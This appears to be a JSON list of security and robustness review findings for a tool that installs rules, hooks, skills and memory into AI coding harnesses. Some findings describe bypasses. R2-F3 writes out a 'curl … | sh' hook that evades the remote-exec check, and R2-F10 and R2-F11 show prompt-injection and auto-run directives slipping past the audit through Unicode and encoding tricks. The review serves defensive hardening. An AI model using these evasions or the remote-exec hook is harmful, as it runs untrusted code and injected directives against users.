{"id":"R1-F28","severity":"minor","title":"no-final-newline round trip still not byte-exact; verify-side collectFiles unbounded and silent on symlinks/unreadable dirs","file":"src/integrations/markdown-block.ts","line":321,"class":"robustness","impact":"install+uninstall changes 'human' to 'human\\n' and deletes whitespace-only files; verify can walk unbounded trees","suggested_fix":"record and restore the final-newline state; add caps and named problems to external.ts collectFiles","evidence":"S2/rules optin.ts part C (roundtrip=false); external.ts:287-303","confidence":"high"},
{"id":"R2-F1","severity":"major","title":"case folding misses U+017F (APFS alias of s): reserved-path, SKILL.md casing and duplicate guards bypassed","file":"src/bundle/paths.ts","line":101,"class":"incomplete Unicode case folding","impact":"registry overwrite and permanent DoS of external imports; ſKILL.md passes the casing rule; s/ſ duplicates overwrite each other; also the path of R1-F2","suggested_fix":"portable-ASCII path segments or full case folding (NFKC + toUpperCase().toLowerCase()) in one shared helper; dev/ino comparison of reserved targets","evidence":"S2/bundle/fold.ts, p3r2.ts, vk.ts (verify exits 1 after the registry is overwritten), p10b.ts; S2/ext/pa.ts","confidence":"high","class_scope":{"sites":["src/bundle/paths.ts:101-103","src/bundle/paths.ts:121-125","src/bundle/paths.ts:149","src/bundle/manifest.ts:72","src/bundle/external.ts:164-171","src/bundle/uninstall.ts ledger keys"],"enumeration_method":"keryx ctx rg 'caseFold|toLowerCase|normalize\\(' src/bundle; exhaustive BMP alias scan against APFS (fold.ts)"}},
{"id":"R2-F2","severity":"major","title":"external-imports integrity key is bundle-plantable and accepted empty, symlinked or loosely permissioned","file":"src/bundle/external.ts","line":120,"class":"integrity secret stored in attacker-writable tree","impact":"an attacker who plants the key can sign any registry; a zero-length key gives a known MAC","suggested_fix":"move and reserve the key (e.g. ~/.keryx/state/), O_EXCL 0600, refuse wrong length/symlink/owner/mode, timingSafeEqual","evidence":"S2/ext/pg.ts (empty key accepted); paths.ts:105-111 reserved list lacks the key","confidence":"high","class_scope":{"sites":["src/bundle/external.ts:120-131","src/bundle/external.ts:142-148","src/bundle/external.ts:223-232","src/bundle/paths.ts:105-111"],"enumeration_method":"read every integrityKeyPathFor/loadIntegrityKey/loadOrCreateIntegrityKey use"}},
{"id":"R2-F3","severity":"major","title":"hook audit only reads string command; schema-valid argv hooks get zero checks","file":"src/security/audit-harness/index.ts","line":146,"class":"audit walker out of sync with the enforced schema","impact":"argv [sh,-c,'curl … | sh'] imports with --allow-hooks; the remote-exec check never fires on the import path","suggested_fix":"walk command.argv, treat sh|bash|zsh -c <arg> as a shell string; end-to-end plan→audit→apply test with an argv hook","evidence":"S2/bundle/p9r2.ts; imported-bundles.test.ts:238/:269 use string commands plan refuses","confidence":"high","class_scope":{"sites":["src/security/audit-harness/index.ts:146-160","src/security/audit-harness/index.ts:251 (bundle path)","src/security/audit-harness/index.ts:546 (live hooks surface)","src/security/audit-harness/checks.ts:449 checkHookRemoteExec","src/security/audit-harness/imported-bundles.test.ts:238,269"],"enumeration_method":"read collectHookCommands callers and compare with the hook-config schema enforced in plan.ts:245-262"}},
{"id":"R2-F4","severity":"major","title":"O(n²) manifest prefix-collision check before any entry cap; 290 KB archive hangs inspect 95 s","file":"src/bundle/manifest.ts","line":82,"class":"algorithmic DoS on untrusted input","impact":"inspect, documented safe on untrusted bundles, is a CPU DoS","suggested_fix":"refuse contents.length > maxEntries first; Set of folded dir prefixes (O(n×depth))","evidence":"S2/bundle/pquad.ts, w/quad/q.tar.gz: 40k entries 18 s, 100k entries 95 s","confidence":"high","class_scope":{"sites":["src/bundle/manifest.ts:72-90","src/bundle/archive.ts entry cap applied after parseManifest"],"enumeration_method":"read parseManifest loops and the order of limit checks in openBundle"}},
{"id":"R2-F5","severity":"major","title":"CRLF/CR memory entries lose Target-Harnesses restriction; handoff drops Source-Harness entries yet reports complete","file":"src/memory/store.ts","line":327,"class":"line-ending-dependent header parse fails open","impact":"restricted entries leak to every harness via MCP resources; AC7 complete with missing entries","suggested_fix":"normalize \\r\\n and \\r to \\n at the top of parseEntry/collectEntriesStrict; CRLF/CR fixtures in store and handoff tests","evidence":"S2/mem/p2.ts 'resources list claude LEAKS: [codex-crlf, codex-cr]' and reads leak the secret text; p3.ts S10 handoff complete exit 0","confidence":"high","class_scope":{"sites":["src/memory/store.ts:208","src/memory/store.ts:327","src/memory/store.ts:349","src/memory/store.ts:466","src/memory/store.ts:477","src/mcp/resources.ts:163,247","src/memory/service.ts:263,327,346","src/commands/memory.ts:550"],"enumeration_method":"keryx ctx rg 'split\\(\"\\\\n\"\\)|headerBlockMatches|field\\(' src/memory, then every consumer of parseEntry"}},
{"id":"R2-F6","severity":"major","title":"an unsafe rule name makes rules-export report failed while still writing the block and recording no state; dry-run disagrees","file":"src/integrations/surfaces-rules.ts","line":64,"class":"reported status does not match disk effect","impact":"exit 1 with CLAUDE.md modified; harness never refreshed by bundle import; doctor hides or marks it invalid","suggested_fix":"route skipped rules to warnings and record the surface, or refuse before writing; inspectRulesExport accounts for skipped","evidence":"S2/rules/cli3 (exit 1, block present, no install-state); cli5 (dry-run would-install, exit 0)","confidence":"high","class_scope":{"sites":["src/integrations/surfaces-rules.ts:64-67","src/integrations/surfaces-rules.ts:80-87","src/integrations/installer.ts:464-468","src/integrations/rules-export.ts:73-92"],"enumeration_method":"read every rulesSpec consumer and the custom-install path installer.ts:442-478"}},
{"id":"R2-F7","severity":"major","title":"rules distill splits the keryx:rules block, leaving an orphan start marker that wedges rules-export","file":"src/rules/distill.ts","line":92,"class":"managed-block writer unaware of sibling managed blocks","impact":"rules-export install/uninstall/doctor fail with 'unterminated' until manual repair; rules block also self-indexed via syncAgentRules","suggested_fix":"carry every keryx:* managed block through distill and sync untouched; exclude from section splitting","evidence":"S2/rules/distill: CLAUDE.md ends with a lone <!-- keryx:rules -->; re-install 'unterminated … block'","confidence":"high","class_scope":{"sites":["src/rules/distill.ts:92-102","src/rules/distill.ts:104-133","src/rules/distill.ts:199-207","src/rules/agent-entrypoints.ts:65-70"],"enumeration_method":"keryx ctx rg 'endMarker|END_MARKER|indexOf\\(' src/lib src/rules src/commands, read each replacer"}},
{"id":"R2-F8","severity":"major","title":"symlink refusal also blocks in-repo symlinks (CLAUDE.md -> AGENTS.md), breaking the default instructions install half-applied","file":"src/integrations/markdown-block.ts","line":118,"class":"over-broad refusal / regression against main","impact":"default gemini-cli, kiro, copilot installs exit 1 after writing settings; common repo layouts cannot install","suggested_fix":"refuse only when the realpath leaves the root or hits another harness's managed file; validate all targets before any write","evidence":"S2/rules/sym1: GEMINI.md -> AGENTS.md default install exit 1 after .gemini/settings.json written; copilot exit 1","confidence":"high","class_scope":{"sites":["src/integrations/markdown-block.ts:118-135","src/integrations/markdown-block.ts:402","src/integrations/markdown-block.ts:466","src/integrations/markdown-block.ts:509"],"enumeration_method":"diff of markdown-block.ts plus a CLI probe per harness"}},
{"id":"R2-F9","severity":"minor","title":"concurrent external imports lose registry updates","file":"src/bundle/external.ts","line":463,"class":"read-modify-write without lock","impact":"a vetted import silently goes unrecorded","suggested_fix":"wx lock file or re-read and merge under lock","evidence":"S2/ext/pd.ts 9/15 trials recorded=1","confidence":"high"},
{"id":"R2-F10","severity":"minor","title":"injection/auto-run checks evaded by zero-width, soft hyphen, homoglyph, full-width, NFD, HTML entities","file":"src/security/audit-harness/checks.ts","line":69,"class":"text normalisation gap","impact":"directive text passes the audit","suggested_fix":"NFKC, strip default-ignorables, decode entities, confusable map before matching","evidence":"S2/ext/pc.ts; pb.ts byp-soft-hyphen, byp-md-entity accepted","confidence":"high"},
{"id":"R2-F11","severity":"minor","title":"JSON kinds checked as serialized text; escaped newline hides an auto-run directive","file":"src/security/audit-harness/index.ts","line":338,"class":"checks on encoded rather than decoded content","impact":"learned-pattern auto-run imported","suggested_fix":"parse JSON and check every string value","evidence":"S2/ext/pi.ts json-newline imported","confidence":"high"},
{"id":"R2-F12","severity":"minor","title":"binary assets reject whole skills and doc-text remote-exec examples are flagged high","file":"src/security/audit-harness/index.ts","line":172,"class":"audit false positive","impact":"skills with images cannot be vetted or round-tripped; misleading audit-not-applicable/audit-incomplete","suggested_fix":"magic-byte binary allowlist recorded as hashed-but-unscanned; remote-exec in fenced/prose text at medium; drop bare fetch","evidence":"S2/ext/pj.ts 5/7 flagged; PNG and UTF-16 fixtures rejected; BOM/CRLF text not rejected","confidence":"high"},
{"id":"R2-F13","severity":"minor","title":"unreadable file aborts the whole external vetting batch; unreadable dir and FIFO skipped silently","file":"src/gdskills/governance/scout.ts","line":661,"class":"unnamed failure / silent skip","impact":"one bad candidate kills the batch; partially scanned candidate accepted","suggested_fix":"named per-candidate unreadable rejection","evidence":"S2/ext/pb.ts perm-dir accepted; EACCES uncaught","confidence":"high"},
{"id":"R2-F14","severity":"minor","title":"Target-Harnesses line below the first ## is ignored, entry visible to all","file":"src/memory/store.ts","line":338,"class":"invalid restriction treated as absent","impact":"hand-authored restriction silently lost","suggested_fix":"treat an out-of-header harness line as invalid (hidden + problem)","evidence":"S2/mem/p2.ts","confidence":"medium"},
{"id":"R2-F15","severity":"minor","title":"init/rules sync abort midway on a prose mention of a marker and omit the file name","file":"src/rules/agent-entrypoints.ts","line":157,"class":"error handling","impact":"half-built .metaproject; unclear message","suggested_fix":"whole-line marker matching, pre-scaffold check, name the file","evidence":"S2/rules/orph init exit 1","confidence":"high"},
{"id":"R2-F16","severity":"minor","title":"re-import after a render failure reports success without rendering","file":"src/commands/bundle.ts","line":360,"class":"render gated on writes","impact":"rules block never written after the cause is fixed","suggested_fix":"render whenever --render-for is given; print messages","evidence":"S2/rules/bC retry exit 0, no CLAUDE.md","confidence":"high"},
{"id":"R2-F17","severity":"minor","title":"integrations docs and help text inaccurate","file":"docs/docs/integrations.md","line":259,"class":"docs drift","impact":"users expect byte-exact restore and all-surface default","suggested_fix":"correct integrations.md:239-264 and src/commands/integrations.ts:518","evidence":"S2/rules optin.ts part C; CLI help","confidence":"high"},
{"id":"R2-F18","severity":"minor","title":"empty bundle export succeeds but cannot be imported","file":"src/bundle/export.ts","line":133,"class":"missing precondition","impact":"unusable artefact reported ok","suggested_fix":"refuse zero entries","evidence":"export --kind hook-config,memory-entry → entries 0, id keryx-user-e3b0c44298fc; import schema-invalid","confidence":"high"},
{"id":"R2-F19","severity":"minor","title":"deterministic TTL from createdAt makes bundles older than 30 days import expired patterns","file":"src/bundle/plan.ts","line":85,"class":"fix side effect","impact":"imported candidates expire immediately","suggested_fix":"max(createdAt, now)+30d; ttl-only difference counts as identical","evidence":"plan.ts:85-90","confidence":"high"},
{"id":"R2-F20","severity":"minor","title":"non-ENOENT read errors treated as absent: unreadable user file planned new, clobbered, deleted on rollback","file":"src/bundle/plan.ts","line":108,"class":"error swallowed as absent","impact":"user data loss for an unreadable pre-existing file","suggested_fix":"only ENOENT is absent; other errors refuse with a named reason","evidence":"S2/bundle/p8.ts","confidence":"high"},
{"id":"R2-F21","severity":"minor","title":"several round-1 fixes lack regression tests; one Unicode test asserts nothing","file":"src/bundle/paths.test.ts","line":1,"class":"test adequacy","impact":"regressions of F12/F13/F16/F17/F22/F23/F24/F28 would go unnoticed","suggested_fix":"add tests that fail on 8d6638b9; fix the canonical-equal third case","evidence":"lane review of test diffs","confidence":"high"},
{"id":"R2-I1","severity":"info","title":"memory/MCP: guard/parser whitespace mismatch, visibility default true, index.md not a resource, sac.review dedup unfiltered, private-dir parent symlink, review-note title unguarded","file":"src/mcp/tools.ts","line":155,"class":"hardening","impact":"none demonstrated","suggested_fix":"default visibility false; lstat every component","evidence":"S2/mem REPORT N4-N10","confidence":"medium"},
{"id":"R2-I2","severity":"info","title":"registry MAC omits schemaVersion/version counter (replay); zero-length key read race; case-insensitive staging","file":"src/bundle/external.ts","line":142,"class":"hardening","impact":"not demonstrated end to end","suggested_fix":"MAC the full canonical document with a counter","evidence":"code reading","confidence":"medium"},
{"id":"R2-I3","severity":"info","title":"rules: exotic separators pass the path filter harmlessly; distill truncation unreachable; lstat/write TOCTOU","file":"src/rules/export-render.ts","line":186,"class":"hardening","impact":"none demonstrated","suggested_fix":"none required","evidence":"S2/rules/uni.ts","confidence":"medium"},
{"id":"R2-I4","severity":"info","title":"bundle core hardening: inspect forces allowHooks, parseUstar extra copy (812 MB for 250 MB entry), bomb misreported, negative octal, ledger dir symlink, resolveProjectRoot at ~/.git, BOM/CRLF agent refused","file":"src/bundle/inspect.ts","line":62,"class":"hardening","impact":"misleading inspect result, memory spikes","suggested_fix":"see bundle lane I-a..I-f","evidence":"S2/bundle REPORT info","confidence":"medium"},
{"id":"R2-I5","severity":"info","title":"pre-fix install state with rules-export under instructions flag is harmless","file":"src/integrations/surfaces-rules.ts","line":71,"class":"verified","impact":"none","suggested_fix":"none","evidence":"S2/rules/cli4","confidence":"high"},
{"id":"R2-I6","severity":"info","title":"22 local suite failures are environmental (global author-email hook); tsc clean","file":"src/wiki/source-gate.test.ts","line":1,"class":"verified","impact":"none","suggested_fix":"none","evidence":"re-run with GIT_AUTHOR_EMAIL set: 122/123 pass, remaining one is the pre-push hook env","confidence":"high"}
]
```
